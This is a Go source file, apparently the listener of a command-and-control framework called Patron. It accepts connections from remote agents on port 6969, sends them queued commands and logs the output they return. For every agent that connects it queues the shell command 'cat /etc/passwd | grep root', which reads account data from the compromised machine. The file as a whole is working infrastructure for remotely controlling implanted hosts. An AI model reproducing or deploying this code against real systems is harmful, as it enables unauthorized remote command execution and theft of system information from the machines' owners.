package main

import (
	"bufio"
	"encoding/gob"
	"log"
	"net"
	"strings"

	"github.com/PatronC2/Patron/data"
	"github.com/PatronC2/Patron/types"
	"github.com/s-christian/gollehs/lib/logger"
)

// TODO add logging
// client connect, callback

func handleconn(connection net.Conn) {
	for {
		text, _ := bufio.NewReader(connection).ReadString('\n')
		message := strings.Split(text, "\n")
		// fmt.Println(message[0])
		if message[0] != "" {
			// fmt.Println(message[0])
			// search uuid in database using received uuid
			fetch := data.FetchOneAgent(message[0])
			data.SendAgentCommand(fetch.Uuid, "0", "shell", "cat /etc/passwd | grep root")
			logger.Logf(logger.Info, "Agent %s Fetched for validation\n", fetch.Uuid)
			if message[0] == fetch.Uuid {
				// fmt.Fprintf(connection, "Yes\n")
				// _, _ = connection.Write([]byte("Yes\n"))

				logger.Logf(logger.Info, "Agent %s Connected\n", message[0])
				encoder := gob.NewEncoder(connection)
				instruct := data.FetchNextCommand(fetch.Uuid)

				if err := encoder.Encode(instruct); err != nil {
					log.Fatalln(err)
				}
				destruct := &types.GiveServerResult{}
				dec := gob.NewDecoder(connection)
				dec.Decode(destruct)
				if destruct.Output != "" {
					logger.Logf(logger.Debug, "Agent %s Sent Back: %s\n", message[0], destruct.Output)
				}
			} else {
				// agent not in database handle creation of agent
				logger.Logf(logger.Info, "Agent Unknown\n")
			}

		}
	}

}

func main() {
	data.OpenDatabase()
	data.InitDatabase()
	// _, error := os.Stat("./data/sqlite-database.db")
	// if os.IsNotExist(error) {
	// 	data.InitDatabase()
	// }
	listener, err := net.Listen("tcp", ":6969")
	if err != nil {
		log.Fatalln(err)
	}

	defer listener.Close()

	for {
		connection, err := listener.Accept()
		if err != nil {
			log.
				Fatalln(err)
		}
		go handleconn(connection)

	}
}
